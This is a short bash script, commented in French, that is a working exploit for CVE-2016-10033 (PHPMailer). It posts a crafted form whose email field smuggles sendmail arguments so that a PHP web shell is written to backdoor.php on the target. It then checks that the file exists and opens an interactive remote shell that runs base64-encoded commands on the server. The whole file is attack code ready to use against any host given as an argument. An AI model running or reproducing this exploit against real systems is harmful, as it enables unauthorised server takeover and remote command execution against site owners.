#!/bin/bash
# CVE-2016-10033 exploit

echo '[+] exemple d éxploitation CVE-2016-10033'

if [ -z "$1" ]
then
    echo '[-] Error : Préciser un host !'
    exit -1
fi

if [ $(uname) == 'Darwin' ]
then
    decoder='base64 -D'
elif [ $(uname) == 'Linux' ]
then
    decoder='base64 -d'  
else
    echo '[-] Votre machine n est supporté : '$(uname)
    exit -1
fi


host=$1

echo '[+] Lancement de l éxploitation '$host

curl -sq 'http://'$host -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzXJpHSq4mNy35tHe' --data-binary $'------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="action"\r\n\r\nsubmit\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="name"\r\n\r\n<?php echo "|".base64_encode(system(base64_decode($_GET["cmd"])))."|"; ?>\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="email"\r\n\r\n\"vulnerables\\\" -OQueueDirectory=/tmp -X/www/backdoor.php server\" @test.com\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="message"\r\n\r\nPwned\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe--\r\n' >/dev/null && echo '[+] Target exploited, acessing shell at http://'$host'/backdoor.php'

echo '[+] Vérification si le fichier backdoor a été creé sur le host ciblé'
code=$(curl -o /dev/null --silent --head --write-out '%{http_code}\n' "http://$host/backdoor.php")

if [ "$code" != "200" ]
then
    echo '[-] Cible non exploitable'
    exit -1
else
    echo '[+] Backdoor.php trouvé dans le host ciblé'
fi

echo ' Vous avez la main pour saisir Les commandes à exécuter sur le serveur distant ...'
echo ' (tappez exit pour sortir du shell)'
cmd='whoami'
while [ "$cmd" != 'exit' ]
do
    if ! curl -sq http://$host/backdoor.php?cmd=$(echo -ne $cmd | base64) | grep '|' | grep -v 'base64_encode' | head -n 1 | cut -d '|' -f 2 | $decoder 
    then
        echo '[-] Problème de connexion ...'
        exit -1
    fi
    echo
    read -p 'RemoteShell> ' cmd
done
echo '[+] Sortie'
